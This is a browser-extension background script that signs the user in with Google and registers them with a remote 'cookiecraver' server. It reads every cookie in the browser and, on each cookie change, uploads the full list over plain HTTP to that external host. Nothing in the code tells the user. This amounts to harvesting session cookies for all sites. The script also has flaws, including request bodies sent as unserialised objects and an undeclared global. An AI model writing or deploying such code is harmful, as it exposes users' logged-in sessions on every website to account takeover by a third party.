const USER_KEY = 'sessionUser';
const USER_URL = 'https://www.googleapis.com/oauth2/v1/userinfo?alt=json&access_token=';
const DEBOUNCE_TIME = 600;
const API_URL = 'http://cookiecraver.azurewebsites.net';

chrome.runtime.onInstalled.addListener(() => {
  chrome.declarativeContent.onPageChanged.removeRules(undefined, () => {
    chrome.declarativeContent.onPageChanged.addRules([{
      conditions: [new chrome.declarativeContent.PageStateMatcher({
      })
      ],
      actions: [new chrome.declarativeContent.ShowPageAction()]
    }]);
  });

  chrome.identity.getAuthToken({
    interactive: true
  }, (token) => {
    if (chrome.runtime.lastError) {
      alert(chrome.runtime.lastError.message);
      return;
    }
    const x = new XMLHttpRequest();
    x.open('GET', `${USER_URL}${token}`);
    x.onload = () => {
      console.log(x.response);
      const user = JSON.parse(x.response);
      fetch(`${API_URL}/user/cookies?uid=${user.id}`)
        .then((r) => {
          if (!r.ok && r.status === 404) {
            throw new Error(r.statusText);
          }
          return r;
        })
        .then(() => {
          chrome.storage.sync.set({ [USER_KEY]: JSON.parse(x.response) });
        })
        .catch((e) => {
          fetch(`${API_URL}/user`, {
            method: 'POST',
            body: {
              uid: user.id,
              fname: user.given_name,
              sname: user.family_name,
              pic: user.picture,
            }
          }).then(() => {
            chrome.storage.sync.set({ [USER_KEY]: JSON.parse(x.response) });
          })
        });
    };
    x.send();
  });

  chrome.storage.sync.set({
    [USER_KEY]: {
      email: "emailegmail.com",
      family_name: "user",
      gender: "",
      given_name: "test",
      id: "1234",
      link: "https://plus.google.com/1234",
      name: "Test User",
      picture: "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg",
      verified_email: true,
    }
  });

  let timeOutID;
  chrome.storage.sync.set({ sessionCount: 0 });
  chrome.cookies.getAll({}, (cookies) => {
    allCookies = cookies;
  });
  chrome.cookies.onChanged.addListener((info) => {
    const {
      cause,
      cookie,
      removed
    } = info;
    window.clearTimeout(timeOutID);
    timeOutID = window.setTimeout(() => chrome.cookies.getAll({}, (cookies) => {
      chrome.storage.sync.set({ count: cookies.length });
      chrome.storage.sync.get([USER_KEY], (val) => {
        const { sessionUser } = val;
        fetch(`${API_URL}/user/update`, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json',
          },
          mode: 'cors',
          cache: 'default',
          body: {
            uid: sessionUser.id,
            new: cookies,
          }
        });
      });
    }), DEBOUNCE_TIME);

  });
});
